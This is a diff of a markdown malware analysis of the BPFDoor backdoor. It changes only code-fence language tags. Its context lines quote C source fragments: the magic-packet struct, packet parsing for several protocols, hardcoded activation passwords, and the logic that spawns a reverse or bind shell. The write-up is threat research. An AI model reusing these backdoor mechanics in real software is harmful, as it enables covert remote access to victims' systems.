@@ -149,7 +149,7 @@ Some references may not be fully reliable.
 
 ### Magic Packet
 The following code is the C structure of the magic packet used to activate BPFDoor.
-```C
+```c
 struct magic_packet{
     unsigned int    flag;
     in_addr_t       ip;
@@ -168,7 +168,7 @@ struct magic_packet{
 
 The following C code parses custom magic packets delivered over TCP, UDP, and ICMP protocols. This indicates that BPFDoor is capable of establishing remote connections through packets using **TCP**, **UDP**, and **ICMP**.
 
-```C
+```c
 switch(ip->ip_p) {
     case IPPROTO_TCP:
         tcp = (struct sniff_tcp*)(buff+14+size_ip);
@@ -193,12 +193,12 @@ switch(ip->ip_p) {
 The login passwords received by the malware are as follows:
  - justforfun
  - socket
-```C
+```c
 {0x6a, 0x75, 0x73, 0x74, 0x66, 0x6f, 0x72, 0x66, 0x75, 0x6e, 0x00}; // justforfun
 {0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74, 0x00}; // socket
 ```
 
-```Python
+```python
 data = [0x6a, 0x75, 0x73, 0x74, 0x66, 0x6f, 0x72, 0x66, 0x75, 0x6e, 0x00]
 for i in data:
     print(chr(i), end='')
@@ -229,7 +229,7 @@ In summary, the command structure of this malware operates as follows:
 - `justforfun` command → Spawns a **reverse shell**
 - `socket` command → Spawns a **bind shell**
 
-```C
+```c
 cmp = logon(mp->pass); // Check the command
 switch(cmp) {
     case 1:
@@ -251,7 +251,7 @@ switch(cmp) {
 
 When spawning a bind shell, the malware selects a random port within the range **42391** to **43390**.
 
-```C
+```c
 for (port = 42391; port < 43391; port++) { // 42391 - 43390
     my_addr.sin_port = htons(port);
     if( bind(sock_fd,(struct sockaddr *)&my_addr,sizeof(struct sockaddr)) == -1 ){
